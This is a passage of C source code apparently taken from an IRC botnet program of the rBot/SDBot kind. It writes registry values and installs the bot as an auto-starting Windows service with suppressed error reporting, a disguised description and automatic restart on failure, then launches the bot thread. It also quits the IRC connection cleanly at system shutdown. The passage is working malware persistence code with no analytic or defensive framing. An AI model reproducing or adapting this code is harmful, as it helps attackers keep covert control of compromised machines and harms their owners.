		strcpy(szRegBuffer,Data.szQuery);

		// Change all \n to \0 then double null terminate
		szRegBuffer[nLen]='\0';				// Double null
		szRegBuffer[nLen+1]='\0';

		for (i=0;i<nLen;++i)
			if (szRegBuffer[i]=='\n')
				szRegBuffer[i]='\0';

		// If blank then must use nLen = 0, ignoring \0\0 (blank values not allowed)
		// Otherwise take our stringlen + 2 (double null) as the size
		if (nLen != 0)
			nLen = nLen + 2;

		if (fRegSetValueEx(hRegKey,KeyName,0,REG_MULTI_SZ,(CONST BYTE *)szRegBuffer,(DWORD)nLen) != ERROR_SUCCESS)
		{
			fRegCloseKey(hRegKey);
			return FALSE;
		}
		break;

	default:
		fRegCloseKey(hRegKey);
		return FALSE;
		break;

	}

	fRegCloseKey(hRegKey);
	return TRUE;

}


#ifndef NO_SERVICE

SC_HANDLE scm;

extern IRC mainirc;
SERVICE_STATUS ss; 
SERVICE_STATUS_HANDLE ssh; 
VOID WINAPI ShutdownHandler(DWORD Opcode)
{
	DWORD status;
	switch(Opcode)
	{
	case SERVICE_CONTROL_SHUTDOWN:
		if (mainirc.is_connected())
		{
			mainirc.quit("System shutting down.");
			Sleep(FLOOD_DELAY);
			mainirc.disconnect();
			fWSACleanup();
			ExitProcess(EXIT_SUCCESS);
		}
		ss.dwCurrentState = SERVICE_PAUSED;
		break;
	default:
		break;
	}

	// Send current status. 
	if (!fSetServiceStatus(ssh,&ss))
		status = GetLastError();
	return;
}


int ServiceMain(int argc, char *argv[])
{
	ss.dwServiceType = SERVICE_WIN32; 
	ss.dwCurrentState = SERVICE_START_PENDING; 
	ss.dwControlsAccepted = SERVICE_ACCEPT_SHUTDOWN;
	ss.dwWin32ExitCode = 0; 
	ss.dwServiceSpecificExitCode = 0; 
	ss.dwCheckPoint = 0; 
	ss.dwWaitHint = 0; 
	ssh = fRegisterServiceCtrlHandler(servicename,ShutdownHandler);

    // not sure if this is needed for the shutdown handler but why not
    ss.dwCurrentState       = SERVICE_RUNNING; 
    ss.dwCheckPoint         = 0; 
    ss.dwWaitHint           = 0; 
	fSetServiceStatus(ssh,&ss);

	DWORD id;
	HANDLE threadhandle;
	//create a new thread pointing to the function that the service will run
	if((threadhandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ServiceThread, NULL, 0, &id)) == 0)
		return 0;
	//waits for the thread to close and handle to end before the function closes.
	WaitForSingleObject(threadhandle, INFINITE);
	
	CloseHandle(threadhandle);
	return 0;
}

BOOL ReconfigureService(LPSTR lpDesc);
int InstallService(char *svcpath)
{
	DWORD le;
	SC_HANDLE service;
    char path[MAX_PATH];

	sprintf(path, "\"%s\"", svcpath);
	
	//open a handle to SCM with the create service flag
	if(!(scm = fOpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE)))
		return 0;
	//install the service pointing to our .exe with full access rights, with its own process, w/o error reporting, with auto start on boot
	if(!(service = fCreateService(scm, servicename, servicedisplayname, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS|SERVICE_INTERACTIVE_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path, NULL, NULL, NULL, NULL, NULL)))
	{
		le=GetLastError();
		//if the service already exists..then run it!
		if(le==ERROR_DUPLICATE_SERVICE_NAME || le==ERROR_SERVICE_EXISTS)
		{
			ServiceRun();
		}
		//some shit happened..service couldn't install
		else
			return 0;
	}
	//no error during install..proceed to run the service
	else
	{
		ReconfigureService(servicedesc);
		ServiceRun();
	}
	//cleanup
	fCloseServiceHandle(service);
	fCloseServiceHandle(scm);
	
	return 0;
}

int ServiceRun() 
{ 
    SC_HANDLE service;
//	SERVICE_STATUS status; 
	
	//open a handle to SCM with full control rights
	if(!(scm = fOpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS)))
		return 0;
	//gain a handle to our service (ServiceName) with full rights
	if(!(service = fOpenService(scm, servicename, SERVICE_ALL_ACCESS)))
		return 0;
	//start the service w/o argument strings.
	if(fStartService(service, 0, NULL) == 0)
		return 0;
	//cleanup
	fCloseServiceHandle(scm);
    fCloseServiceHandle(service); 
    return 0;
}

DWORD WINAPI ServiceThread(LPVOID param)
{
	DWORD id;
	HANDLE threadhandle;
	if((threadhandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)BotThread, NULL, 0, &id)) == 0)
		return 0;
	WaitForSingleObject(threadhandle, INFINITE);
	CloseHandle(threadhandle);
	ExitThread(0);
}

BOOL ReconfigureService(LPSTR lpDesc) 
{ 
    SC_HANDLE service;
	SC_LOCK sclLock; 
	SC_ACTION scBuf;
	LPQUERY_SERVICE_LOCK_STATUS lpqslsBuf; 
	SERVICE_DESCRIPTION sdBuf;
	SERVICE_FAILURE_ACTIONS sfBuf;
	DWORD dwBytesNeeded; 
	BOOL bSuccess=TRUE;

	//open a handle to SCM with full control rights
	if(!(scm = fOpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS)))
		return FALSE;
	//gain a handle to our service (ServiceName) with full rights
	if(!(service = fOpenService(scm, servicename, SERVICE_ALL_ACCESS)))
		return FALSE;
	
	//need to acquire database lock before reconfiguring. 
	//if the database cannot be locked, report the details. 
	if (!(sclLock = fLockServiceDatabase(scm))) 
	{
		if (GetLastError() != ERROR_SERVICE_DATABASE_LOCKED) 
			return FALSE;

		// Allocate a buffer to get details about the lock.
		lpqslsBuf = (LPQUERY_SERVICE_LOCK_STATUS) LocalAlloc(LPTR,sizeof(QUERY_SERVICE_LOCK_STATUS)+256); 
		if (lpqslsBuf == NULL) 
			return FALSE;
 
		// Get and print the lock status information. 
		if (!fQueryServiceLockStatus(scm, lpqslsBuf, sizeof(QUERY_SERVICE_LOCK_STATUS)+256, &dwBytesNeeded)) 
			return FALSE;

		/*if (lpqslsBuf->fIsLocked)
		{
#ifdef _DEBUG
			printf("Locked by: %s, duration: %d seconds\n",lpqslsBuf->lpLockOwner,lpqslsBuf->dwLockDuration); 
#endif
		}*/

		LocalFree(lpqslsBuf); 
	}

	// The database is locked, so it is safe to make changes. 
	// Open a handle to the service. 
	scm = fOpenService(scm, servicename, SERVICE_CHANGE_CONFIG);
	if (service == NULL) 
		return FALSE;

	scBuf.Delay=3000;
	scBuf.Type=SC_ACTION_RESTART;

	sfBuf.lpsaActions=&scBuf;
	sfBuf.cActions=1;
	sfBuf.lpCommand=0;
	sfBuf.lpRebootMsg=0;
	sfBuf.dwResetPeriod=10;

	if(!fChangeServiceConfig2(service, SERVICE_CONFIG_FAILURE_ACTIONS, &sfBuf))
		bSuccess = FALSE;

	sdBuf.lpDescription = lpDesc;

	if(!fChangeServiceConfig2(service, SERVICE_CONFIG_DESCRIPTION, &sdBuf))
		bSuccess = FALSE;

	// Release the database lock. 
	fUnlockServiceDatabase(sclLock); 

	fCloseServiceHandle(service);
	fCloseServiceHandle(scm);

	return bSuccess;
}
#endif



